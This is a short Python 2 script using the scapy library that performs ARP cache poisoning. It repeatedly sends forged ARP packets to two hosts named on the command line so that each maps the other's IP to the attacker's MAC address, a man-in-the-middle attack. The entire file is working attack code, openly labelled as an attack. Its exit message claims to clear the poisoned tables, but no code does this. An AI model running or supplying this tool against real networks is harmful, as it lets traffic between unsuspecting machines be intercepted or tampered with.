#!/usr/bin/python
_author_="Shruti Sonawane"

from scapy.all import *
import sys


#some useful methods

#method to discover the local hardware address
def GetLocalMac():
    try:
        allMacs = [get_if_hwaddr(i) for i in get_if_list()]
        for mymac in allMacs:
            if(mymac != "00:00:00:00:00:00"):
                return mymac
    except Exception as ex:
        print ex

#method to poison the ARP table entry for the target machine
def PoisonTargetNode(mymac, targetIP, impersonateIP):
    packet = Ether()/ARP(op="who-has",hwsrc=mymac,psrc=impersonateIP,pdst=targetIP)
    sendp(packet)
    return

if len(sys.argv) != 3:
    print "The arguments need to be: first-host-IP second-host-IP "
    sys.exit(1)

#get local mac address
currentMAC = GetLocalMac()
if currentMAC is None:
    print "Error while getting local MAC address. Exiting..."
    sys.exit(1)
else:
    print "Local MAC address is ",currentMAC

try:
    while(True):
        #poison arp entry for machine1
        PoisonTargetNode(currentMAC,sys.argv[1],sys.argv[2])
        #poison arp entry for machine2
        PoisonTargetNode(currentMAC,sys.argv[2],sys.argv[1])

except KeyboardInterrupt:
    print "Stopping the attack...."
    print "Clearing all ARP poisoned tables.. Exiting."
    sys.exit(0)


